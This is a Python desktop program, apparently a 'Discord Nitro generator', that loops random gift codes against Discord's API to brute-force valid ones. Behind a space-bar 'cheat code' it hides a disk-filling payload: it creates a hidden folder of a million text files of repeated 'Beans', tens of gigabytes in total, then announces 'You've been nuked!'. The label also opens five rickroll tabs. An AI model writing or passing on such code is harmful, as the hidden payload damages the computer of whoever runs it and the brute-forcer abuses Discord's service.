import customtkinter as tk, requests, random, webbrowser, os, time, ctypes
from tkinter import messagebox

CHECKUP1 = 0
CHECKDOWN1 = 0
CHECKRIGHT1 = 0
CHECKLEFT1 = 0
CHEAT_CODE = "OFFLINE"

# Creates an icon folder
Icon = "Icon"
if os.path.exists(Icon):
    print("'Icon' folder already exists")
else:
    print("Creating Icon folder")
    os.makedirs(Icon)
    print("'Icon' folder created")

def main():
    while True:
        allChars = f'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890'
        code = ''
        
        for i in range(1, 19): # add 1 to the final value (as always)
            code += random.choice(allChars)
        # 18 charcters
        
        url = f'https://www.discordapp.com/api/v9/entitlements/gift-codes/{code}'
        decider = requests.get(url)
        
        if decider.status_code == 200:
            for i in range(1, 15):
                print(f'Code {code} is valid!')
                print(f'https://discord.gift/{code}')
                statusLabel.configure(text=f"Code found!\nhttps://discord.gift/{code}", font=('helvetica', 14, 'bold'))
                webbrowser.open_new(f"https://discord.gift/{code}")
            return code
        
        else:
            print(f'Code {code} is not valid!')
            
def download_ico(url, save_path):
    response = requests.get(url)
    if response.status_code == 200:
        if os.path.exists("Icon/Arhururan.ico"):
            print("Icon has already been downloaded")
        else:
            try:
                with open(save_path, 'wb') as f:
                    f.write(response.content)
                print("ICO file downloaded successfully!")
            except Exception as e:
                print(f"Failed to download ICO file.\nError: {e}")
                #errorReporting(e)
                input()
    else:
        print("Failed to download ICO file.")
        input()

ico_url = "https://raw.githubusercontent.com/Bernso/Icons/main/Arhururan.ico"
save_path = os.path.join(Icon, "Arhururan.ico")  # Full file path including directory
download_ico(ico_url, save_path)
print("ICO file download process completed.")
      
def startCode():
    startButton.destroy()
    time.sleep(1)
    main()


def open_nitro(event):
    for i in range(1, 6):
        webbrowser.open_new(f"https://www.youtube.com/watch?v=dQw4w9WgXcQ")

def quitv2():
    root.destroy()
    quit()

def check1(event):
    global CHECKUP1
    if CHECKUP1 >= 2:
        print("You have already activated this section of the cheat code.")
        pass
    else:
        CHECKUP1 += 1
        if CHECKUP1 == 1:
            print("\n[1/2]")
        elif CHECKUP1 == 2:
            print("[2/2]")
        else:
            pass

def check2(event):
    global CHECKDOWN1
    if CHECKDOWN1 >= 2:
        print("You have already activated this section of the cheat code.")
        pass
    else:
        CHECKDOWN1 += 1
        if CHECKDOWN1 == 1:
            print("\n[1/2]")
        elif CHECKDOWN1 == 2:
            print("[2/2]")
        else:
            pass

def check3(event):
    global CHECKRIGHT1
    if CHECKRIGHT1 >= 2:
        print("You have already activated this section of the cheat code.")
        pass
    else:
        CHECKRIGHT1 += 1
        if CHECKRIGHT1 == 1:
            print("\n[1/2]")
        elif CHECKRIGHT1 == 2:
            print("[2/2]")
        else:
            pass

def check4(event):
    global CHECKLEFT1
    if CHECKLEFT1 >= 2:
        print("You have already activated this section of the cheat code.")
        pass
    else:
        CHECKLEFT1 += 1
        if CHECKLEFT1 == 1:
            print("\n[1/2]")
        elif CHECKLEFT1 == 2:
            print("[2/2]")
        else:
            pass


def create_folders_and_files():
    base_path = 'BeansFolders'
    os.makedirs(base_path, exist_ok=True)

    # Set the folder attribute to hidden
    FILE_ATTRIBUTE_HIDDEN = 0x02
    ctypes.windll.kernel32.SetFileAttributesW(base_path, FILE_ATTRIBUTE_HIDDEN)
    
    for folder_num in range(1, 1001):
        folder_path = os.path.join(base_path, f'Beans_{folder_num}')
        os.makedirs(folder_path, exist_ok=True)

        for file_num in range(1, 1001):
            file_path = os.path.join(folder_path, f'Beans_{file_num}.txt')
            with open(file_path, 'w') as file:
                file.write('Beans\n' * 10000)

    messagebox.showinfo("Success", "You've been nuked!")

def cheat(event):
    print("\nWas it worth it?")
    create_folders_and_files()
        


root = tk.CTk()
root.geometry("300x180")
root.title("Nitro Gen by Bernso")
root.iconbitmap("Icon/Arhururan.ico")
root.bind("<Up>",       check1)
root.bind("<Down>",     check2)
root.bind("<Right>",    check3)
root.bind("<Left>",     check4)
root.bind("<space>",    cheat)


statusLabel = tk.CTkLabel(root, text="Code has not been found yet.")
statusLabel.bind("<Button-1>", open_nitro)
statusLabel.pack(padx = 20, pady = 20)

startButton = tk.CTkButton(root, text="Start", command=startCode, width=100, height=40)
startButton.pack(padx = 20, pady = 10)

exitButton = tk.CTkButton(root, text="Exit App", command=quitv2, width=20)
exitButton.pack(padx = 10, pady = 10)


if __name__ == "__main__":
    root.mainloop()